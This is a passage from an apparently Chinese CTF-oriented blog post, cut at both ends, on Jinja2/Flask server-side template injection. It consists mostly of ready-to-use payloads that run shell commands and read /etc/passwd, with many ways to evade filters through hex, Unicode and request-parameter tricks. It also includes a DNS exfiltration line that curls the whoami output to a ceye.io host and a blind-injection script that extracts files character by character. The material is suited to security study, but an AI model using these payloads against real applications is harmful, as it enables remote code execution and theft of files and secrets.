class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">WarningMessage</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[59]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="python2和python3通用方法">python2和python3通用方法</h3><h4 id="builtins-代码执行"><code>__builtins__</code>代码执行</h4><p>把上面<code>local_find.py</code>脚本search变量赋值为<code>__builtins__</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219142748.png" alt=""></p><p>再调用<code>eval</code>等函数和方法即可，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>总而言之，原理都是先找到含有<code>__builtins__</code>的类，然后再进一步利用。</p><h4 id="os"><code>os</code></h4><p>这个我在python3.8环境下好像没能找到直接含有os的类，python2.7.18下有两个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">&lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="获取配置信息">获取配置信息</h3><h4 id="config">config</h4><p>通常会用<code>&#123;&#123;config&#125;&#125;</code>查询配置信息</p><h4 id="request">request</h4><p>jinja2中存在对象<code>request</code></p><p>查询一些配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="url-for">url_for</h4><p>查询配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="get-flashed-messages">get_flashed_messages</h4><p>查询配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Bypass">Bypass</h2><h3 id="过滤">过滤<code>.</code></h3><h4 id="绕过">[]绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#39;__class__&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="attr-绕过"><code>attr()</code>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(&#39;__class__&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="getattr-绕过"><code>getattr()</code>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;getattr((),&quot;__class__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤引号">过滤引号</h3><p>五种不同的请求方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.args.name</span><br><span class="line">request.values.name</span><br><span class="line">request.cookies.name</span><br><span class="line">request.headers.name</span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure><h4 id="GET">GET</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="POST">POST</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">POST:arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="Cookie">Cookie</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line">Cookie:arg1=open;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="chr绕过">chr绕过</h4><h3 id="过滤-v2">过滤<code>_</code></h3><h4 id="编码绕过">编码绕过</h4><p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">376</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>关键字也可以使用十六进制编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string1=<span class="string">&quot;__class__&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span>(<span class="params">string</span>):</span></span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">      result=result+<span class="string">&quot;\\x&quot;</span>+hex(ord(string[i]))[<span class="number">2</span>:]</span><br><span class="line">  print(result)</span><br><span class="line">  </span><br><span class="line">tohex(string1)</span><br></pre></td></tr></table></figure><p>比如说NCTF2020 你是我的master吗 这道题：</p><p>waf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&quot;&quot;[&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;][&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;]()[64][&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;][&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;](&quot;\x6f\x73&quot;)[&quot;\x70\x6f\x70\x65\x6e&quot;](&quot;ls&quot;)[&quot;\x72\x65\x61\x64&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>全16进制，只能在SSTI的时候用。</p><h4 id="request绕过">request绕过</h4><p>同上</p><h3 id="过滤关键字">过滤关键字</h3><h4 id="双写、大小写">双写、大小写</h4><h4 id="拼接字符">拼接字符</h4><p>+拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>join拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure><p>格式化+管道符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</span><br></pre></td></tr></table></figure><h4 id="替代方法">替代方法</h4><p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p><p>过滤config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤-v3">过滤<code>[]</code></h3><h4 id="索引中的">索引中的<code>[]</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>][<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].pop(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].__getitem__(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="魔术方法中的">魔术方法中的<code>[]</code></h4><p>魔术方法中本来是没有中括号的，但是如果需要使用<code>[]</code>绕过关键字的话，可以用<code>__getattribute__</code>绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;</span><br></pre></td></tr></table></figure><p>也可以配合<code>requests</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1&#x3D;__class__</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure><h3 id="过滤-v4">过滤<code>&#123;&#125;</code></h3><h4 id="DNSLOG外带数据">DNSLOG外带数据</h4><p>用<code>&#123;%%&#125;</code>替代，使用判断语句进行dns外带数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;ssti&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="盲注">盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure><h4 id="print标记">print标记</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure><h2 id="Bypass-Plus">Bypass Plus</h2><p>介绍一些常见过滤组合和最近的赛题。</p><h3 id="过滤-，-和">过滤<code>_</code>，<code>.</code>和<code>'</code></h3><p>python3下可以使用<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>下划线可以用编码绕过和<code>requests</code>绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤args，-和">过滤<code>args</code>，<code>.</code>和<code>_</code></h3><p>参考y1ng师傅的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="Update">Update</h2><h3 id="Unicode绕过">Unicode绕过</h3><p>安洵杯2020 EasyFlask：<a href="https://github.com/D0g3-Lab/i-SOON_CTF_2020">https://github.com/D0g3-Lab/i-SOON_CTF_2020</a></p><p>GitHub上的题目环境有点问题，文件给的好像不全。</p><p>可以看一下过滤：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211009.png" alt=""></p><p>直接来看payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure><p>其中<code>print</code>用来绕过<code>&#123;&#123;&#125;&#125;`，`attr`绕过`.`。然后这里的`lipsum`是一个方法，可以直接调用os方法，也可以使用`__buildins__`：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>再使用Unicode编码绕过![](https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211449.png)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>所以官方给的payload就是：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(<span class="string">&quot;__globals__&quot;</span>))|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;whoami&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()%&#125;</span><br></pre></td></tr></table></figure>在线网址转换：https://www.branah.com/unicode-converterPHP脚本转换：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//字符串转Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_encode</span>(<span class="params">$strLong</span>) </span>&#123;</span><br><span class="line">  $strArr = preg_split(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, $strLong);<span class="comment">//拆分字符串为数组(含中文字符)</span></span><br><span class="line">  $resUnicode = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> ($strArr <span class="keyword">as</span> $str)</span><br><span class="line">  &#123;</span><br><span class="line">      $bin_str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      $arr = is_array($str) ? $str : str_split($str);<span class="comment">//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)</span></span><br><span class="line">      <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value)</span><br><span class="line">      &#123;</span><br><span class="line">          $bin_str .= decbin(ord($value));<span class="comment">//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      $bin_str = preg_replace(<span class="string">&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;</span>, <span class="string">&#x27;$1$2$3&#x27;</span>, $bin_str);<span class="comment">//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;</span></span><br><span 